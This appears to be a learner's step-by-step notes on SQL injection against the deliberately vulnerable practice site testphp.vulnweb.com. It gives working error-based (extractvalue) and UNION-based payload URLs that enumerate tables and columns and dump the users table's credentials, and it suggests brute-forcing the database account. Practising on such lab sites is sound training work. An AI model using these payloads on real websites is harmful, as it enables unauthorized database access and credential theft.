@ :)


1- first get the version of database 

http://testphp.vulnweb.com/listproducts.php?cat=-1+and+extractvalue(rand(),concat(0x3a,(version())))

=> on page display =>Error: XPATH syntax error: ':5.1.73-0ubuntu0.10.04.1' # this the version of mydatabse ? is that important?

yes we can find exploit for this version by typing on google [ exploit mysql 5.1.73]  

@@@ using extractvalue 

2- find database name 

http://testphp.vulnweb.com/listproducts.php?cat=-1+and+extractvalue(rand(),concat(0x3a,(datbase())))

=> database name is : acuart

3- find user database 

http://testphp.vulnweb.com/listproducts.php?cat=-1+and+extractvalue(rand(),concat(0x3a,(user())))

=> user => acuart@localhost

is that important yb yb we can using brute force to agin accecc the remote database 

but try to using nmap to check the port number some time port closed or filtered but we can try access by ssh # looking for the port uses for mysql https://dev.mysql.com/doc/mysql-port-reference/en/mysql-ports-reference-tables.html

4-find the table name 

but @ wait we ant check if we can dumps the database by union and order by 

# http://testphp.vulnweb.com/listproducts.php?cat=-1+order+by+1   # no data found it only empty content we ant change the 1 to find num columns 

[ -- using union ] 

http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,2,3,4,5,6,7,8,9,10,11


=> on page display coulmns => 11,7,2,9   => we can return multi data to each one of this columns let's try 

http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,user(),3,4,5,6,database(),8,9,10,version()--


find the name of the table 

http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,user(),3,4,5,6,group_concat(table_name),8,9,10,11+from+information_schema.tables+where+table_schema=database()--

=> we are inject to columns to return the tables name in mysql database 
=> artists,carts,categ,featured,guestbook,pictures,products,users


=> let's defiend the columns name on the [users] table => i think it's interesting table name 


http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,user(),3,4,5,6,group_concat(table_name),8,9,10,11+from+information_schema.tables+where+table_schema=database()--



from+information_schema.columns+where+table_name='users'--





http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,user(),3,4,5,6,group_concat(column_name),8,9,10,11+from+information_schema.columns+where+table_name=%27users%27--

=> uname,pass,cc,address,email,name,phone,cart

+from+information_schema.tables+where+table_name=%27users%27--

%27 => single quote(')
%20 => space 

=> uname,pass,cc,address,email,name,phone,cart

[ ok now we want get the uname column and pass ] 


http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,2,3,4,5,6,7,8,9,10,(SELECT+(uname,cart)+FROM+users)--

Error: Operand should contain 1 column(s) Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74

# how to solve this porblem ? we cant return 2 column in this way 


using contact to contact to fileds as one 

http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+all+1,2,3,4,5,6,7,8,9,10,(SELECT+CONCAT(pass,uname)+FROM+users)--


=> username = test & password = test 



# done 

